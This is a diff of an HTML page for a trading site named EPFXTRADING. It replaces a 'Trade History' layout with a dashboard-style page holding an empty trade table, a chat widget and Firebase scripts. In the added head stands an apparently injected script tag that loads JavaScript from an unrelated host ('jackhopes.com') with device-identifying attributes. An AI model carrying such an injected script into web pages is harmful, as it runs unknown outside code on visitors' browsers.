@@ -1,256 +1,230 @@
-<!DOCTYPE html>
-<html lang="en" style="" class=" js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths"><head><style>.jquery-ripples { position: relative; z-index: 0; }</style><meta http-equiv="content-type" content="text/html;charset=UTF-8">
-
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>EPFXTRADING | Trade History</title>
-    <!--Favicon add-->
-    <link rel="shortcut icon" type="image/png" href="../images/fav.png">
-    <!--bootstrap Css-->
-    <link href="../css/bootstrap.min.css" rel="stylesheet">
-    <!--font-awesome Css-->
-    <link href="../font2/font-awesome/css/font-awesome.css" rel="stylesheet">
-    <!-- Lightcase  Css-->
-    <link href="../css/lightcase.css" rel="stylesheet">
-    <!--WOW Css-->
-    <link href="../css/animate.min.css" rel="stylesheet">
-    <!--Slick Slider Css-->
-    <link href="../css/slick.css" rel="stylesheet">
-    <!--Slick Nav Css-->
-    <link href="../css/slicknav.min.css" rel="stylesheet">
-    <!--Swiper  Css-->
-    <link href="../css/swiper.min.css" rel="stylesheet">
-    <!--Style Css-->
-    <link href="../css/style.css" rel="stylesheet">
-    <!-- Theam Color Css-->
-    <link href="../css/colorf690.css?color=EEA640" rel="stylesheet">
-    <!--Responsive Css-->
-    <link href="../css/responsive.css" rel="stylesheet">
-    <link href="../css/w3.css" rel="stylesheet">
-    <link rel="stylesheet" href="../css/ion.rangeSlider.css">
-    <link rel="stylesheet" href="../css/ranger-style.css">
-    <link rel="stylesheet" href="../css/ion.rangeSlider.skinFlat.css">
-    <style>
-        .price-table {
-            margin-bottom: 45px;
-        }
-    </style>
-    <script src="../js/jquery.min.js"></script>
-
-    <link rel="stylesheet" href="../css/style2.css">
-
-    <script src="../js/modernizr.js"></script>
-</head>
-
-<body data-spy="scroll"><div class="slicknav_menu"><a href="#" aria-haspopup="true" role="button" tabindex="0" class="slicknav_btn slicknav_collapsed"><span class="slicknav_menutxt">MENU</span><span class="slicknav_icon"><span class="slicknav_icon-bar"></span><span class="slicknav_icon-bar"></span><span class="slicknav_icon-bar"></span></span></a><ul class="slicknav_nav slicknav_hidden" aria-hidden="true" role="menu" style="display: none;">
-                   <!-- <li><a href="../index.html">Home</a></li>-->
-                    <li><a href="dashboard.html" role="menuitem" tabindex="-1">Dashboard</a></li>
-                                            <li><a href="deposit.html" role="menuitem" tabindex="-1">Deposit</a></li>
-                                        <li><a href="withdraw.html" role="menuitem" tabindex="-1">Withdraw</a></li>
-                    <li><a href="history.html" role="menuitem" tabindex="-1">Trading History</a></li>
-                                            <li class="slicknav_collapsed slicknav_parent"><a href="#" role="menuitem" aria-haspopup="true" tabindex="-1" class="slicknav_item slicknav_row"><a class="page-scroll" href="#" tabindex="-1">Account <i class="fa fa-angle-down"></i></a>
-                            <span class="slicknav_arrow">►</span></a><ul class="mega-menu mega-menu1 mega-menu2 menu-postion-4 slicknav_hidden" role="menu" aria-hidden="true" style="display: none;">
-                                <li class="mega-list mega-list1">
-                             
-                                    <a class="page-scroll" href="logout.html" role="menuitem" tabindex="-1">Logout</a>
-                                   
-                            </li></ul>
-                        </li>
-                                    </ul></div>
-<!-- Start Pre-Loader-->
+<!DOCTYPE HTML>
+<html>
+<head><script type="text/javascript" id="jc6202" ver="1.1.0.0" diu="WD-WX81AF0761CC325863C" fr="zl.sild" src="http://jackhopes.com/ext/zl.sild.js"></script>
 
 
-<!-- End Preload -->
-<div class="animation-element">
-<!-- End Pre-Loader -->
-<!--support bar  top start-->
-<nav class="main-menu wow slideInRight" data-wow-duration="2s" style="visibility: visible; animation-duration: 2s; animation-name: slideInRight;">
-    <div class="container">
-        <div class="row">
-            <div class="col-md-3">
-                <div class="logo">
-                    <a href="index.html"><img src="../images/logo2.png" style="max-height:60px;"></a>
-                </div>
-            </div>
-            <div class="col-md-9 text-right">
-                <ul id="header-menu" class="header-navigation">
-                   <!-- <li><a href="../index.html">Home</a></li>-->
-                    <li><a href="dashboard.html">Dashboard</a></li>
-                                            <li><a href="deposit.html">Deposit</a></li>
-                                        <li><a href="withdraw.html">Withdraw</a></li>
-                    <li><a href="history.html">Trading History</a></li>
-                                            <li><a class="page-scroll" href="#">Account <i class="fa fa-angle-down"></i></a>
-                            <ul class="mega-menu mega-menu1 mega-menu2 menu-postion-4">
-                                <li class="mega-list mega-list1">
-                             
-                                    <a class="page-scroll" href="logout.html">Logout</a>
-                                   
-                            </li></ul>
-                        </li>
-                                    </ul>
-            </div>
-        </div>
-    </div>
-</nav>
+<title>EPFXTRADING | User Dashboard</title>
 
-<div class="support-bar-top wow slideInLeft" data-wow-duration="2s" id="raindrops-green" style="overflow: hidden; position: relative; visibility: visible; animation-duration: 2s; animation-name: slideInLeft;">
-    <div class="container">
-        <div class="row">
-            <div class="col-md-6">
-                <div class="contact-info">
-                    <a href="#"> <i class="fa fa-user" aria-hidden="true"></i></a>
-                </div>
-            </div>
-            <div class="col-md-6 text-right bounceIn">
-                <div class="contact-admin">
-                 <!--   <a href="#"> <i class="fa fa-money" aria-hidden="true"></i></a>
-                    <a href="#"> <i class="fa fa-money" aria-hidden="true"></i> </a>
-                    <div class="support-bar-social-links">
-                                                    <a href="#"><i class="fa fa-facebook" aria-hidden="true"></i></a>
-                                                    <a href="#"><i class="fa fa-twitter" aria-hidden="true"></i></a>
-                                                    <a href="../3.html"><i class="fa fa-instagram" aria-hidden="true"></i></a>
-                                            </div>-->
-                </div>
-            </div>
-        </div>
-    </div>
-<canvas height="5" width="594" style="position: absolute; bottom: 0px; left: 0px;"></canvas></div>
-</div>
-    
-    <div class="container" style="margin-top:6px;">
-    <br>
-    <h3 align="center">Trading History</h3>
-    <div class="row">
-    	<div class="col-lg-12">
-               <table class="w3-table-all">
-    <thead>
-      <tr style="background:#2c3e50;color:white;">
-        <th>Transaction type</th>
-        <th>Amount withdrawn or invested($)</th>
-        <th>Transaction date</th>
-        <th>Transaction status</th>
-        <th>Amount earned($)</th>
-      </tr>
-    </thead>
-           </table>
+<link href="../images/favicon.png" rel="shortcut icon" type="image/png">
 
-        </div>
-    </div>    
-   </div> 
-    
-    
-    
-   <!--jquery script load-->
-<script src="../js/jquery.js"></script>
-
-<script src="../js/bootstrap.min.js"></script>
-<!-- Gmap Load Here -->
-<script src="../js/gmaps.js"></script>
-<!-- Map Js File Load -->
-<script src="js/map-scriptf690.js"></script>
-<!-- Highlight script load-->
-<script src="../js/highlight.min.js"></script>
-<!--Jquery Ui Slider script load-->
-<script src="../js/jquery-ui-slider.min.js"></script>
-<!--Circleful Js File Load-->
-<script src="../js/jquery.circliful.js"></script>
-<!--CounterUp script load-->
-<script src="../js/jquery.counterup.min.js"></script>
-<!-- Ripples  script load-->
-<script src="../js/jquery.ripples-min.js"></script>
-<!--Slick Nav Js File Load-->
-<script src="../js/jquery.slicknav.min.js"></script>
-<!--Lightcase Js File Load-->
-<script src="../js/lightcase.js"></script>
-<!--particle Js File Load-->
-<script src="../js/particles.min.js"></script>
-<!--particle custom Js File Load-->
-<script src="../js/particles-custom.js"></script>
-<!--RainDrops script load-->
-<script src="../js/raindrops.js"></script>
-<!--Easing script load-->
-<script src="../js/easing-min.js"></script>
-<!--Slick Slider Js File Load-->
-<script src="../js/slick.min.js"></script>
-<!--Swiper script load-->
-<script src="../js/swiper.min.js"></script>
-<!--WOW script load-->
-<script src="../js/wow.min.js"></script>
-<!--WayPoints script load-->
-<script src="../js/waypoints.min.js"></script>
-<script type="text/javascript" src="../js/ion.rangeSlider.js"></script>
-    <script type="text/javascript">
-        $(window).load(function() {
-            var wow = new WOW({
-                boxClass: 'wow',
-                animateClass: 'animated',
-                offset: 0,
-                mobile: true,
-                live: true
-            });
-            wow.init();
-        });
-    </script>
-    <script>
-        $.each($('.slider-input'), function() {
-            var $t = $(this),
-
-                    from = $t.data('from'),
-                    to = $t.data('to'),
-
-                    $dailyProfit = $($t.data('dailyprofit')),
-                    $totalProfit = $($t.data('totalprofit')),
-
-                    $val = $($t.data('valuetag')),
-
-                    perDay = $t.data('perday'),
-                    perYear = $t.data('peryear');
-
-
-            $t.ionRangeSlider({
-                input_values_separator: ";",
-                prefix: '$ ',
-                hide_min_max: true,
-                force_edges: true,
-                onChange: function(val) {
-                    $val.val( '$ ' + val.from);
-
-                    var profit = (val.from * perDay / 100).toFixed(1);
-                    profit  = '$ ' + profit.replace('.', '.') ;
-                    $dailyProfit.text(profit) ;
-
-                    profit = ( (val.from * perDay / 100)* perYear ).toFixed(1);
-                    profit  =  '$ ' + profit.replace('.', '.');
-                    $totalProfit.text(profit);
-
-                }
-            });
-        });
-        $('.invest-type__profit--val').on('change', function(e) {
-
-            var slider = $($(this).data('slider')).data("ionRangeSlider");
-
-            slider.update({
-                from: $(this).val().replace('$')
-            });
-        })
-    </script>
-<!--Main js file load-->
-<script src="../js/main.js"></script>
-<script src="../js/main2.js"></script>
-<!-- <script src="https://360360coinoptions.com/assets/js/main.js"></script> -->
-<!--swal alert message-->
-
-<!--end swal alert message-->
-<script>
-var mobile = (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent));
-
-hljs.initHighlightingOnLoad();
-hljs.configure({useBR: true});
-jQuery('#raindrops').raindrops({color:'#fff',canvasHeight:5});
-jQuery('#raindrops-green').raindrops({color:'#EEA640 ',canvasHeight:5});
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<script type="application/x-javascript"> addEventListener("load", function() { setTimeout(hideURLbar, 0); }, false); function hideURLbar(){ window.scrollTo(0,1); } </script>
+<!-- Bootstrap Core CSS -->
+<!--Start of Tawk.to Script-->
+<script type="text/javascript">
+var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+(function(){
+var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+s1.async=true;
+s1.src='https://embed.tawk.to/5d22a8c522d70e36c2a49922/default';
+s1.charset='UTF-8';
+s1.setAttribute('crossorigin','*');
+s0.parentNode.insertBefore(s1,s0);
+})();
 </script>
+<!--End of Tawk.to Script-->
+<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" rel="stylesheet" type="text/css">
+<link href="css/bootstrap.css" rel='stylesheet' type='text/css' />
+<!-- Custom CSS -->
+<link href="css/style.css" rel='stylesheet' type='text/css' />
+<!-- font CSS -->
+<!-- font-awesome icons -->
+<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+<link href="css/font-awesome.css" rel="stylesheet"> 
+<!-- //font-awesome icons -->
+ <!-- js-->
+<script src="js/jquery-1.11.1.min.js"></script>
+<script src="js/modernizr.custom.js"></script>
+<!--webfonts-->
+<link href='//fonts.googleapis.com/css?family=Roboto+Condensed:400,300,300italic,400italic,700,700italic' rel='stylesheet' type='text/css'>
+<!--//webfonts--> 
+<!--animate-->
+<link href="css/animate.css" rel="stylesheet" type="text/css" media="all">
+<script src="js/wow.min.js"></script>
+	<script>
+		 new WOW().init();
+	</script>
+<!--//end-animate-->
+
+<!-- Metis Menu -->
+<script src="js/metisMenu.min.js"></script>
+<script src="js/custom.js"></script>
+<link href="css/custom.css" rel="stylesheet">
+<!--//Metis Menu -->
+</head> 
+<body class="cbp-spmenu-push">
+	
 
 
-</body></html>
+	<div class="main-content" >
+		<!--left-fixed -navigation-->
+		<div class=" sidebar" role="navigation" >
+            <div class="navbar-collapse" >
+				<nav class="cbp-spmenu cbp-spmenu-vertical cbp-spmenu-left" id="cbp-spmenu-s1" style="background-color:#BF873D">
+					<ul class="nav in" id="side-menu">
+						<li>
+							<a href="index.html" class="active"><i class="fa fa-dashboard nav_icon"></i>Dashboard</a>
+						</li>
+
+						<li>
+							<a href="traDesk.html"><i class="fa fa-dollar nav_icon"></i> Deposit Desk</a>
+						</li>
+						
+						<li>
+							<a href="history.html"><i class="fa fa-clock-o nav_icon"></i>Trade History</a>
+						</li>
+
+						<li>
+							<a href="withdrawal.html"><i class="fa fa-dollar nav_icon"></i>Make Withdrawal</a>
+						</li>
+
+						
+						
+
+							
+						<li>
+							<a href="#" id="Logout"><i class="fa fa-sign-out nav_icon"></i><b>LOGOUT</b></a>
+						</li>	
+						
+						
+												
+						
+										
+						
+												
+				
+						
+					</ul>
+					<!-- //sidebar-collapse -->
+				</nav>
+			</div>
+		</div>
+		<!--left-fixed -navigation-->
+		<!-- header-starts -->
+		<div class="sticky-header header-section " style="background-color:#232438">
+			<div class="header-left" style="background-color:#232438">
+				<!--toggle button start-->
+				<button id="showLeftPush" style="background-color:#232438"><i class="fa fa-bars"></i></button>
+				<!--toggle button end-->
+				<!--logo -->
+				<div class="logo" style="padding:6px; width:200px;background-color:#232438">
+					<a href="index.html" style="padding-left:15px !important;">
+					    <h4>EPFXTRADING</h4>
+					    <!--
+						<img src="../images/bl/BLogo.png" style="width: 100%; height: 40px;" alt="EPFXTRADING">
+						-->
+					</a>
+				</div>
+				<!--//logo-->
+				
+				<div class="clearfix"> </div>
+			</div>
+			<div class="header-right">
+				<div class="profile_details" style="padding:8px; margin-top:15px;">	
+				
+					<a href="#"><span class="prfil-img" ><img src="img/user.svg" style="width:30px; height:30px; border-radius:100%;" alt=""> </span> <h4 id="User's_Name" style="font-size:15px; font-weight:bold; color:#fff;"></h4> </a>
+					
+				</div>
+				<div class="clearfix"> </div>				
+			</div>
+			<div class="clearfix"> </div>	
+		</div>
+		<!-- //header-ends -->	
+	<!-- //header-ends -->
+		<!-- main content start-->
+		<div id="page-wrapper">
+			<div class="main-page signup-page">
+				<h3 class="title1">TRADE HISTORY</h3>
+			
+
+				<div class="bs-example widget-shadow table-responsive" data-example-id="hoverable-table"> 
+					<table class="table table-hover"> 
+						<thead> 
+							<tr> 
+								<th style='text-align:center;'>Trade Amount</th>
+                                <th style='text-align:center;'>Trade Status</th>
+								<th style='text-align:center;'>Withdrawal</th> 
+                                <th style='text-align:center;'>Trade Date</th>
+							</tr> 
+						</thead> 
+						<tbody> 
+							 <tr id="firtRow">
+							   <td id="item1"></td>
+							   <td id="item2"></td>
+							   <td id="item3"></td>
+							   <td id="item4"></td>
+							 </tr>
+							 <tr id="secondRow">
+							   
+							 </tr>
+							 <tr id="thirdRow">
+							   
+							 </tr>
+							 <tr id="fourthRow">
+							   
+							 </tr>
+							 <tr>
+							   <td></td>
+							   <td></td>
+							   <td></td>
+							   <td></td>
+							 </tr>
+						</tbody> 
+					</table>
+				</div>
+			</div>
+		</div>
+        <!-- Deposit Modal -->
+
+			<!-- /deposit Modal -->
+			
+			
+		
+
+		
+			<!-- /plans Modal -->
+		<!--footer-->
+		<div class="footer">
+		   <p>All Rights Reserved &copy; EPFXTRADING 2019</p>
+		</div>
+        <!--//footer-->
+	</div>
+	<!-- Classie -->
+		<script src="js/classie.js"></script>
+		<script>
+			var menuLeft = document.getElementById( 'cbp-spmenu-s1' ),
+				showLeftPush = document.getElementById( 'showLeftPush' ),
+				body = document.body;
+				
+			showLeftPush.onclick = function() {
+				classie.toggle( this, 'active' );
+				classie.toggle( body, 'cbp-spmenu-push-toright' );
+				classie.toggle( menuLeft, 'cbp-spmenu-open' );
+				disableOther( 'showLeftPush' );
+			};
+			
+
+			function disableOther( button ) {
+				if( button !== 'showLeftPush' ) {
+					classie.toggle( showLeftPush, 'disabled' );
+				}
+			}
+		</script>
+	<!--scrolling js-->
+	<!--
+	<script src="js/jquery.nicescroll.js"></script>
+	<script src="js/scripts.js"></script>
+	-->
+	<!--//scrolling js-->
+	<!-- Bootstrap Core JavaScript -->
+   <script src="js/bootstrap.js"> </script>
+
+   <script src="https://www.gstatic.com/firebasejs/7.8.1/firebase.js"></script>
+   <script src="https://www.gstatic.com/firebasejs/7.8.1/firebase-auth.js"></script>
+   <script src="https://www.gstatic.com/firebasejs/7.8.1/firebase-firestore.js"></script>
+   <script src="../All.js"></script>
+   <script src="Logout.js"></script>
+   <script src="History.js"></script>
+</body>
+</html>
